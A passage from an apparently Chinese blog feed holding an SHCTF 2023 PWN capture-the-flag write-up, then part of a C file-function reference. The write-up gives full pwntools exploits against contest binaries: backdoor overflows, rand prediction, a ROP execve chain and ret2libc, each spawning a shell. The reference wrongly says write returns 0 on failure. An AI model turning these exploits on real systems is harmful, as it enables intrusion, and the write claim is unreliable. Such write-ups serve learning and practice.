<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>, <span class="number">32837</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x4015E4</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x32</span> + <span class="number">7</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>或者，也可以通过nop滑梯来解决，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>, <span class="number">30541</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x4015E4</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x32</span> + p64(<span class="number">0</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="猜数游戏">猜数游戏</span></h2><p>ida反汇编，代码审计发现有个后门函数 fun11 ，想办法调用后门函数，首先先得绕过 if 函数，输入小于等于11的就行，然后就是想办法跳出while循环，这就需要看 compare 函数，若s与v6相等，则跳出循环，然后就要看到int_num_to_ascii 函数（该函数主要功能是将一个整数转换为ASCII字符数组）将一个随机数转化为ascll码值赋值给v6，并且s是用户输入的值，就可以输入随机数让其等于v6，这样就可以获得shell了，直接干就完事了</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/6.png"></p>
<p>主要还得认真理清代码中的逻辑，这样才好解决问题</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>, <span class="number">32854</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">num = <span class="built_in">str</span>(libc.rand())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;how many digit you think about this number?\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">11</span>))</span><br><span class="line">p.sendline(num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ropchain">ropchain</span></h2><p>查看一下保护机制，64位打开了canary和NX，然后还是个静态链接的程序</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/7.png"></p>
<p>ida反汇编，观察了一下，你会发现只有read这里发生了溢出，然后又是静态链接，可以直接用ROPgadget去寻找rop执行流（不懂可看这里<a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(2)/">PWN PWN PWN !!! 技巧 (2)</a>）</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/8.png"></p>
<p> 使用 <code>ROPgadget --binary 文件 --ropchain</code> 生成构造链。</p>
<p>这样的话就可以直接构造payload了，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment">#io =process(&#x27;./111&#x27;)</span></span><br><span class="line">io =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30578</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000419a1c</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041ac41</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000417e25</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041ac41</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401d1d</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401858</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000417e25</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401243</span>) <span class="comment"># syscall</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> +<span class="number">8</span>) + p</span><br><span class="line"> </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="babystack">babystack</span></h2><p>查看一下保护机制，64位打开了NX</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/9.png"></p>
<p>ida反汇编一下，代码审计你会发现没有binsh和system，就发生了一个栈溢出，你就可以想到是需要用ret2libc的方法来解决，这题是通过 write 函数来泄露 libc （不懂的可以看这里，可以套用模板<a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! 技巧 (1)</a>）这里就不多讲了</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/10.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#p =process(&#x27;./111&#x27;)</span></span><br><span class="line">p =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">31645</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.23-0ubuntu11.3_amd64.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">main_addr =<span class="number">0x400718</span></span><br><span class="line">write_plt =elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got =elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ret_addr =<span class="number">0x400581</span></span><br><span class="line">rdi_addr =<span class="number">0x400833</span></span><br><span class="line">pop_rsi_r15 =<span class="number">0x400831</span></span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>) + p64(rdi_addr) +p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>) +p64(write_plt)+ p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"> </span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base +  <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>)  +p64(rdi_addr) + p64(bin_sh) +p64(sys_addr)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="showshowway">showshowway</span></h2><p>查看一下保护机制，64位程序打开了NX</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/11.png"></p>
<p>ida反汇编一下，代码审计你会发现gets函数造成了溢出，并且需要让 y 等于 p，就可以直接绕过if1语句，执行后门函数，接下来就是该怎么构造payload（s与y相距了0x40个字节，意思就是输入0x40个字节的数据就可以覆盖到 y ,然后再修改其内容，使其与p相等就可以了）这里需要认真思考，记录一下</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/12.png"></p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/13.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p =process(&#x27;./111&#x27;)</span></span><br><span class="line">p =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30218</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> +<span class="string">b&#x27;showshowway\x00&#x27;</span></span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="pkmon">pkmon</span></h2><p>查看一下保护机制，64位程序只打开了NX</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/14.png"></p>
<p>ida反汇编一下，发现有个后门函数，并且发现可以利用puts的got表地址来执行后门函数，从而获得shell</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/15.png"></p>
<p>所以我们需要找到找到puts的got表地址，从而求出v1的值，这样就可以打通了</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/16.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p =process(&#x27;./111&#x27;)</span></span><br><span class="line">p =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30452</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">got_addr =elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">backdoor = <span class="number">0x40072B</span></span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;-17&#x27;</span> +p64(backdoor)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="总结">总结</span></h1><p>这次比赛收获挺多的，大部分题目都是需要通过自己分析代码来解决问题，非常考验代码审计的能力，能力还得慢慢提升，加油！！！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>SHCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN PWN PWN !!! 技巧 (5)</title>
    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(5)/</url>
    <content><![CDATA[<p>PWN PWN PWN !!! 技巧 (5)</p>
<span id="more"></span>

<h1><span id="简介">简介：</span></h1><p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! 技巧 (1)</a></p>
<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! 技巧 (2)</a></p>
<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! 技巧 (3)</a></p>
<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(4)/">PWN PWN PWN !!! 技巧 (4)</a></p>
<p>紧接上续四部，这次准备记录一下常见的函数的功能（容易忘记，记录一手），好记性不如烂笔头。</p>
<hr>
<h2><span id="fgets">fgets</span></h2><p><code>fgets</code> 用于从指定的流中读取一行文本或字符串，并将其存储到指定的字符串变量中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *str, <span class="type">int</span> n, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>str</code>：指向字符数组的指针，读取的字符串将存储在这里。</li>
<li><code>n</code>：要读取的最大字符数（包括最终的 null 字符）。</li>
<li><code>stream</code>：指向 FILE 对象的指针，该对象标识从中读取字符的流。</li>
</ul>
<p>停止读取的条件：</p>
<ul>
<li>读取了 <code>n-1</code> 个字符；</li>
<li>读取了换行符；</li>
<li>到达文件末尾。</li>
</ul>
<p>返回值：</p>
<ul>
<li>成功：返回 <code>str</code>；</li>
<li>失败或 EOF：返回 <code>NULL</code>，<code>str</code> 不变。</li>
</ul>
<hr>
<h2><span id="fclose">fclose</span></h2><p><code>fclose</code> 主要用于关闭一个打开的文件流，同时刷新所有缓冲区。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>stream</code>：指向要关闭的文件流对象。</li>
</ul>
<p>返回值：</p>
<ul>
<li>成功：返回 <code>0</code>；</li>
<li>失败：返回 <code>EOF</code>。</li>
</ul>
<hr>
<h2><span id="fopen">fopen</span></h2><p><code>fopen</code> 主要作用是打开一个文件以进行各种操作（读、写、追加等）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span>;</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>filename</code>：要打开的文件名。</li>
<li><code>mode</code>：文件访问模式：</li>
</ul>
<table>
<thead>
<tr>
<th>模式</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>&quot;r&quot;</code></td>
<td>以只读方式打开文件，文件不存在则返回 <code>NULL</code>。</td>
</tr>
<tr>
<td><code>&quot;w&quot;</code></td>
<td>以写方式打开文件，文件存在则清空，不存在则创建新文件。</td>
</tr>
<tr>
<td><code>&quot;a&quot;</code></td>
<td>以追加方式写入文件末尾，不存在则创建。</td>
</tr>
<tr>
<td><code>&quot;r+&quot;</code></td>
<td>打开可读可写文件，文件不存在返回 <code>NULL</code>。</td>
</tr>
<tr>
<td><code>&quot;w+&quot;</code></td>
<td>可读写，新建或清空文件内容。</td>
</tr>
<tr>
<td><code>&quot;a+&quot;</code></td>
<td>可读可写，追加到文件末尾，不存在则新建。</td>
</tr>
</tbody></table>
<p>返回值：</p>
<ul>
<li>成功：返回 <code>FILE*</code> 指针；</li>
<li>失败：返回 <code>NULL</code>。</li>
</ul>
<hr>
<h2><span id="fwrite">fwrite</span></h2><p><code>fwrite</code> 将数据从 <code>ptr</code> 指向的数组写入到给定流中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>ptr</code>：指向要写入的内存区域；</li>
<li><code>size</code>：单个元素的大小（字节）；</li>
<li><code>nmemb</code>：写入的元素数量；</li>
<li><code>stream</code>：目标文件流指针。</li>
</ul>
<p>返回值：</p>
<ul>
<li>实际写入的元素数量，类型为 <code>size_t</code>；</li>
<li>若不等于 <code>nmemb</code>，说明出错或写入不完整。</li>
</ul>
<hr>
<h2><span id="write">write</span></h2><p><code>write</code> 将数据从缓冲区写入文件描述符（低层系统调用）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>fd</code>：文件描述符（<code>1</code> 表示标准输出）；</li>
<li><code>buf</code>：要写入的数据缓冲区；</li>
<li><code>count</code>：要写入的字节数。</li>
</ul>
<p>返回值：</p>
<ul>
<li>成功：返回写入的字节数；</li>
<li>失败：返回 <code>0</code>。</li>
</ul>
<hr>
<h2><span id="fread">fread</span></h2><p><code>fread</code> 从指定文件流中读取数据，存储到给定缓冲区中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

